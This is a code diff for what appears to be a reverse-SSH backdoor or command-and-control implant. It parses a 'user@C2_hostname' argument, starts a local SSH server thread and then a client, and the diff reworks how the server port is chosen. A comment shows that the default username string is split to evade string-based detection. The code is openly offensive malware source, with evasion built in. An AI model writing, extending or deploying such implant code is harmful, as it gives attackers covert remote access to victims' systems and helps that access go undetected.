@@ -33,12 +33,11 @@ systemctl restart ssh
 */
 
 void help(char* self) {
-    debug("Usage: %s [user@C2_hostname [LOCAL_SSH_SERVER_PORT]\n", self);
+    debug("Usage: %s [user@C2_hostname\n", self);
     debug("Example: %s user@C2_hostname\n", self);
-    debug("Example: %s user@C2_hostname 1234\n", self);  
     debug("Example: %s -t 16909060\n", self);
     debug("Example: %s hostname\n", self);
-    debug("Defaults: user is `anonymous` and LOCAL_SSH_SERVER_PORT is 2222\n");
+    debug("Defaults: user is `anonymous`\n");
     exit(1);
 }
 
@@ -53,7 +52,6 @@ void integer_to_ip(int ip, char* result) {
 
 void parse_args(int argc, char** argv,
     char* C2_host,
-    int* ssh_server_port_int,
     char* username) {
 
     char* ptr;
@@ -83,25 +81,16 @@ void parse_args(int argc, char** argv,
         strncpy(C2_host, argv[1], 255);
     }
 
-    if (argc == 3) {
-        ssh_server_port = argv[2];
-        *ssh_server_port_int = atoi(ssh_server_port);
-        if (ssh_server_port_int == 0) {
-            help(argv[0]);
-        }
-    }
-
     if (C2_host[0] == '0') {
         help(argv[0]);
-    }
-    
+    }   
 }
 
 int main(int argc, char** argv){
     char* C2_port = NULL;    
     char C2_host[256] = {0};
     char* ssh_server_port = NULL;
-    int ssh_server_port_int = 2222;
+    int ssh_server_port_int = 0;
     char username[101] = {0};
 
     // default user, splitted to avoid strings detection
@@ -110,15 +99,22 @@ int main(int argc, char** argv){
     strncat(username, "ous", 100);
 
     
-    parse_args(argc, argv, C2_host, &ssh_server_port_int, username);
+    parse_args(argc, argv, C2_host, username);
 
     ssh_init(); // mandatory
 
     // Server
     auto server = SSHServer();
-    std::thread server_thread(server.run, ssh_server_port_int);
+    std::thread server_thread(server.run, &ssh_server_port_int);
 
-    std::this_thread::sleep_for(std::chrono::seconds(1));
+    while (ssh_server_port_int == 0 && ssh_server_port_int != -1 ){
+        std::this_thread::sleep_for(std::chrono::seconds(1));
+    }
+
+    if (ssh_server_port_int == -1) { // could not bind any port for the SSH server
+        ssh_finalize();
+        return 1;
+    }
 
     // Client
     auto client = SSHClient();
